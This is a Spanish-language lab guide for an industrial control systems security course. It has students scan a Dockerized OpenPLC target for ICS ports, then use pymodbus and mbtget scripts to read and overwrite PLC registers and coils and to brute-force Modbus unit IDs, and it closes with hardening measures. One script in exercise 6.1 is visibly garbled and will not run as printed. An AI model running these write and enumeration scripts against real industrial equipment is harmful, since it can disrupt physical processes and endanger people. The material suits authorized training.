# 🦸 Unit 7: Ciberseguridad Industrial (ICS/OT) - LAB PRÁCTICO

## 📋 Requisitos Previos

### Software Requerido
- **Docker** y **Docker Compose**
- **Cliente SSH**
- **Python 3** con librerías Modbus
- **Wireshark** (para captura de tráfico)

### Conocimientos Recomendados
- Conceptos de sistemas ICS/SCADA
- Protocolos industriales (Modbus, OPC, DNP3)
- Arquitectura de control industrial
- Diferencia entre IT y OT

---

## 🎯 Objetivos de Aprendizaje

1. ✅ **Comprender** la arquitectura de sistemas ICS
2. ✅ **Enumerar** dispositivos industriales en la red
3. ✅ **Conectar** y comunicar con PLCs usando Modbus
4. ✅ **Leer y escribir** registros en PLCs
5. ✅ **Identificar** vulnerabilidades en sistemas OT
6. ✅ **Proponer** medidas de hardening

---

## 🏗️ Arquitectura del Laboratorio

```
┌──────────────────────────────────────────────────────────────────┐
│                      LABORATORIO 7                                │
│                 CIBERSEGURIDAD INDUSTRIAL                           │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│   ┌─────────────┐                            ┌─────────────┐      │
│   │    KALI    │        ATAQUE              │    PLC      │      │
│   │   LINUX    │  ──────────────────────→  │  OpenPLC    │      │
│   │ (Atacante) │                            │             │      │
│   │192.168.62.2│                           │192.168.62.3│      │
│   └─────────────┘                            └─────────────┘      │
│        │                                            │              │
│        │  • nmap (escaneo industrial)              │              │
│        │  • pymodbus (Python Modbus)              │              │
│        │  • Wireshark (análisis de protocolo)    │              │
│        │  • mbtget (cliente Modbus)             │              │
│        │  • modscan (escaner Modbus)             │              │
│        │                                          │              │
│        │        PROTOCOLO MODBUS:                  │              │
│        │        • Puerto: 502 (TCP)              │              │
│        │        • Unidad ID: 1                   │              │
│        │        • Holding Registers: 0-1000      │              │
│        │        • Input Registers: 0-1000        │              │
│        │        • Coils: 0-1000                  │              │
│        │                                          │              │
│        │            RED: 192.168.62.0/24       │              │
└────────┼──────────────────────────────────────────┼──────────────┘
         │
     SSH:2222
```

---

## 🚀 INSTRUCCIONES DETALLADAS

### Paso 1: Iniciar el Laboratorio

```bash
cd docker-labs/unit7
docker-compose up -d

# Verificar
docker ps
```

### Paso 2: Instalar Herramientas

```bash
# En Kali
apt-get update
apt-get install -y python3-pip wireshark

# Instalar librerías Python para Modbus
pip3 install pymodbus python3-nmap

# Instalar herramientas específicas
pip3 install modscan
```

### Paso 3: Conectar a Kali

```bash
ssh root@localhost -p 2222
# Password: toor
```

### Paso 4: Obtener IP del PLC

```bash
# Ver red
docker network inspect docker-labs_unit7_lab-network | grep IPv4Address

# Escanear
nmap -sn 192.168.62.0/24
```

---

## ⚔️ EJERCICIOS DE ATAQUE - GUÍA DETALLADA

### Ejercicio 1: Reconocimiento de Red Industrial

**Duración**: 20 minutos

**Objetivo**: Identificar dispositivos ICS en la red

#### 1.1 Escaneo de Puertos Comunes

```bash
# Puertos ICS comunes
nmap -p 502,102,5020,44818,47808,20000,34980 192.168.62.0/24

# Escaneo rápido
nmap -F 192.168.62.0/24

# Detección de servicios
nmap -sV -p 502 192.168.62.3
```

**Puertos ICS comunes**:
| Puerto | Protocolo |
|--------|-----------|
| 502 | Modbus TCP |
| 102 | S7comm (Siemens) |
| 5020 | Modbus bridged |
| 44818 | EtherNet/IP |
| 47808 | BACnet |
| 20000 | DNP3 |

#### 1.2 Identificar Dispositivos

```bash
# Banner grabbing
nc -nv 192.168.62.3 502

# Nmap scripts
nmap --script=modbus-enum -p 502 192.168.62.3

# Identificar PLC
nmap -sV -p 502 --script=banner 192.168.62.3
```

---

### Ejercicio 2: Protocolo Modbus - Fundamentos

**Duración**: 25 minutos

**Teoría**: Modbus es un protocolo de comunicación serial ampliamente usado en sistemas SCADA/ICS.

**Estructura de datos Modbus**:
- **Coils**: Bits de salida (read/write)
- **Discrete Inputs**: Bits de entrada (read-only)
- **Holding Registers**: Registros de 16 bits (read/write)
- **Input Registers**: Registros de 16 bits (read-only)

#### 2.1 Conexión Básica con Python

```bash
python3 << 'EOF'
from pymodbus.client import ModbusTcpClient

# Conectar al PLC
client = ModbusTcpClient('192.168.62.3', port=502)

# Verificar conexión
if client.connect():
    print("[+] Conectado al PLC")
    
    # Leer holding registers (dirección 0, 10 registros)
    result = client.read_holding_registers(0, 10, slave=1)
    
    if not result.isError():
        print("[+] Registers:", result.registers)
    else:
        print("[-] Error al leer")
    
    client.close()
else:
    print("[-] No se pudo conectar")
EOF
```

#### 2.2 Leer Diferentes Tipos de Datos

```bash
python3 << 'EOF'
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('192.168.62.3', port=502)

# Leer coils (bits de salida)
coils = client.read_coils(0, 10, slave=1)
print("Coils:", coils.bits if not coils.isError() else "Error")

# Leer discrete inputs
discrete = client.read_discrete_inputs(0, 10, slave=1)
print("Discrete Inputs:", discrete.bits if not discrete.isError() else "Error")

# Leer input registers
inputs = client.read_input_registers(0, 10, slave=1)
print("Input Registers:", inputs.registers if not inputs.isError() else "Error")

# Leer holding registers
holding = client.read_holding_registers(0, 10, slave=1)
print("Holding Registers:", holding.registers if not holding.isError() else "Error")

client.close()
EOF
```

---

### Ejercicio 3: Escritura en Registros

**Duración**: 20 minutos

**Objetivo**: Aprender a modificar valores en el PLC

#### 3.1 Escribir en Holding Registers

```bash
python3 << 'EOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('192.168.62.3', port=502)

# Escribir un valor en un register
# write_register(dirección, valor, slave=id)
result = client.write_register(0, 42, slave=1)

if not result.isError():
    print("[+] Escritura exitosa")
else:
    print("[-] Error en escritura")

client.close()
EOF
```

#### 3.2 Escribir Múltiples Registros

```bash
python3 << 'EOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('192.168.62.3', port=502)

# Escribir múltiples valores
values = [10, 20, 30, 40, 50]
result = client.write_registers(0, values, slave=1)

if not result.isError():
    print("[+] Múltiples registros escritos")
else:
    print("[-] Error")

client.close()
EOF
```

#### 3.3 Escribir en Coils

```bash
python3 << 'EOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('192.168.62.3', port=502)

# Escribir un coil (on/off)
result = client.write_coil(0, True, slave=1)
print("Coil 0:", "OK" if not result.isError() else "Error")

# Escribir múltiples coils
result = client.write_coils(0, [True, False, True, False], slave=1)
print("Coils 0-3:", "OK" if not result.isError() else "Error")

client.close()
EOF
```

---

### Ejercicio 4: Análisis de Tráfico

**Duración**: 15 minutos

**Objetivo**: Capturar y analizar comunicaciones Modbus

#### 4.1 Captura con Wireshark

```bash
# Iniciar Wireshark
wireshark &

# Filtros Modbus
# modbus && ip.addr == 192.168.62.3

# Filtros útiles:
# modbus.func_code == 3  (Read Holding Registers)
# modbus.func_code == 6  (Write Single Register)
# modbus.func_code == 16 (Write Multiple Registers)
```

#### 4.2 Análisis de Protocolo

```bash
# Usar tshark para análisis rápido
tshark -i eth0 -Y "modbus" -c 100

# Ver solo function codes
tshark -i eth0 -Y "modbus" -T fields -e modbus.func_code
```

---

### Ejercicio 5: Herramientas Especializadas

**Duración**: 20 minutos

#### 5.1 Usar mbtget

```bash
# Instalar
apt-get install -y mbtget

# Leer datos
mbtget -a 1 -r 0 -c 10 192.168.62.3

# Escribir valor
mbtget -a 1 -w 0 42 192.168.62.3
```

#### 5.2 Usar Modscan

```bash
# Escanear red Modbus
python3 -m modscan -t 192.168.62.3

# Leer configuración
python3 -m modscan -t 192.168.62.3 -r 0-100
```

---

### Ejercicio 6: Vulnerabilidades y Ataques

**Duración**: 25 minutos

#### 6.1 Enumerar Todas las Funciones

```bash
python'
from pym3 << 'EOFodbus.client import ModbusTcpClient
import pymodbus

functions = [
    ("Read Coils", lambda: client.read_coils(0, 1, slave=1)),
    ("Read Discrete Inputs", lambda: client.read_discrete_inputs(0, 1, slave=1)),
    ("Read Holding Registers", lambda: client.read_holding_registers(0, 1, slave=1)),
    ("Read Input Registers", lambda: client.read_input_registers(0, 1, slave=1)),
    ("Write Single Coil", lambda: client.write_coil(0, True, slave=1)),
    ("Write Single Register", lambda: client.write_register(0, 1, slave=1)),
]

client = ModbusTcpClient('192.168.62.3', port=502)

for name, func in functions:
    try:
        result = func()
        if not result.isError():
            print(f"[+] {name}: Available")
        else:
            print(f"[-] {name}: Not Available")
    except Exception as e:
        print(f"[!] {name}: {e}")

client.close()
EOF
```

#### 6.2 Fuerza Bruta de Unit ID

```bash
python3 << 'EOF'
from pymodbus.client import ModbusTcpClient

for uid in range(1, 250):
    client = ModbusTcpClient('192.168.62.3', port=502, timeout=1)
    try:
        result = client.read_holding_registers(0, 1, slave=uid)
        if not result.isError():
            print(f"[+] Unit ID: {uid}")
    except:
        pass
    client.close()
EOF
```

---

### Ejercicio 7: Hardening de Sistemas ICS

**Duración**: 15 minutos

**Objetivo**: Proponer medidas de seguridad

#### Medidas de Protección

1. **Segmentación de Red**
   - Separar IT y OT
   - Firewalls entre zonas

2. **Autenticación**
   - Usar TLS para Modbus
   - Implementar autenticación fuerte

3. **Monitoreo**
   - IDS/IPS para ICS
   - Logging de todas las operaciones

4. **Acceso**
   - Least privilege
   - RBAC para operadores

---

## 📋 Checklist de Entrega

| # | Tarea | Completado |
|---|-------|-----------|
| 1 | Escanear red para encontrar PLC | ☐ |
| 2 | Identificar dispositivo Modbus | ☐ |
| 3 | Conectar al PLC con Python | ☐ |
| 4 | Leer holding registers | ☐ |
| 5 | Leer coils y discrete inputs | ☐ |
| 6 | Escribir en holding registers | ☐ |
| 7 | Escribir en coils | ☐ |
| 8 | Capturar tráfico Modbus | ☐ |
| 9 | Enumerar Unit ID | ☐ |
| 10 | Propuesta de hardening | ☐ |

---

## 🛑 LIMPIEZA

```bash
cd docker-labs/unit7
docker-compose down -v
```

---

## ✅ Próximo Laboratorio

- **Unit 8**: Laboratorio Final - Mixed Environment
- Un laboratorio que combina todas las técnicas

---

## 📚 Recursos Adicionales

- [pymodbus Documentation](https://pymodbus.readthedocs.io/)
- [ICS-CERT Recommended Practices](https://ics-cert.us-cert.gov/)
- [S4 ICS Security Training](https://securityevents.com/)
- [NERC CIP Standards](https://www.nerc.com/pa/comp/Pages/CIP-All-Topics.aspx)
- [MITRE ATT&CK for ICS](https://attack.mitre.org/matrices/ics/)


---

## ⚠️ Notas de Seguridad

- **SOLO operar en entornos de laboratorio controlados**
- **NUNCA atacar sistemas industriales reales sin autorización**
- **Los sistemas ICS.controlan procesos críticos** - un ataque podría tener consecuencias graves
- **Siempre documenta tus acciones**